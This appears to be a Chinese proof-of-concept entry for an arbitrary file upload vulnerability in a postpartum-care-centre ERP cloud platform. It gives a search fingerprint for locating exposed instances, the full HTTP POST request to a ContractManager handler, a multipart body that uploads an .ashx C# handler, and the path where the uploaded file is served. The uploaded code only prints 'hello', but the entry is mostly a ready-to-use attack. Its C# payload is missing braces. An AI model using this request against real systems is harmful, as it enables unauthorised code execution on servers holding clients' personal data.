# 月子会所ERP管理云平台ContractManager任意文件上传漏洞

- **系统**：月子会所ERP管理云平台ContractManager　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`product="妈妈宝盒-ERP"`
- **请求**：`POST /Page/ContractManager/ashx/Handler.ashx HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=00content0boundary00`　`Host: xx.xx.xx.xx`　`Content-Length: 497`

**请求体 / payload**
```
--00content0boundary00
Content-Disposition: form-data; name="file"; filename="1.ashx"
<% @ webhandler language="C#" class="AverageHandler" %>
using System;
using System.Web;
public class AverageHandler : IHttpHandler
public bool IsReusable
get {
return true;
public void ProcessRequest(HttpContext ctx)
ctx.Response.Write("hello");
--00content0boundary00--

根据回显拼接上传文件位置
/UploadBaseFolder/Contact/1_2309251411214592641.ashx
```

**其他**
- 月子会所ERP管理云平台ContractManager任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现�
***
- 版本: * 月子会所ERP管理云平台